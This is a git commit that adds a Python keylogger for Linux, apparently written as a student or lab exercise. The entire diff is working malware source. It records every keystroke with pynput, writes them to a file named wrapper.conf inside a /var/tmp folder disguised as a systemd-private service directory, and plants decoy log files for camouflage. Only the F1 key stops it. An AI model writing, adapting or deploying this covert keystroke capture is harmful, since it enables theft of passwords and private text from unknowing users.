543ef0f04a733842225dcb69035f1171565f3ce9
Matthew McGuinness <111994291+MattMcGuinRIT@users.noreply.github.com>
2024-09-24 12:03:16 -0400

    Uploaded keylogger script, works for Linux only

---
+++ keylogger.py
@@ -0,0 +1,39 @@
+from pynput import keyboard
+import os
+
+# Specify log file directory (/var/tmp persists after reboot)
+logDirectory = "/var/tmp/systemd-private-c36ab02a889e43a48b4f62f7036ca080-TextWrapper.service-Ud8j9l"
+
+# Create folder that attempts to blend in
+os.makedirs(logDirectory, exist_ok = True)
+
+# Fill directory with extra files with random data for extra camoflague
+with open(logDirectory+"/debug-info.txt", 'w') as file:
+    file.write("[DEBUG] 2024-09-24 10:15:42 - Initializing application...\n")
+
+with open(logDirectory+"/error.log", 'w') as file:
+    file.write( '\x00\x01\x02\n\x03\x04\x05\n\x06\x07\x08\x09\n\x0a\x0b\x0c\x0d\n\x0e\x0f\x10\x11\n\x12\x13\x14\x15\n\x16\x17\x18\x19\n'
+)
+
+# Specify the log file destination with assuming name
+logFile = logDirectory + "/wrapper.conf"
+
+# Captures each key press on the keyboard
+def keyPress(key):
+    try:
+        # Log the key pressed
+        with open(logFile, 'a') as file:
+            file.write(f'{key.char}\n')
+    except AttributeError:
+        # Handle special keys (e.g., Shift, Ctrl, etc.)
+        with open(logFile, 'a') as f:
+            f.write(f'{key}\n')
+
+# Cancels logging if specified key is pressed
+def keyRelease(key):
+    if key == keyboard.Key.f1:
+        return False
+
+# Create keyboard listener
+with keyboard.Listener(on_press = keyPress, on_release = keyRelease) as listener:
+    listener.join()
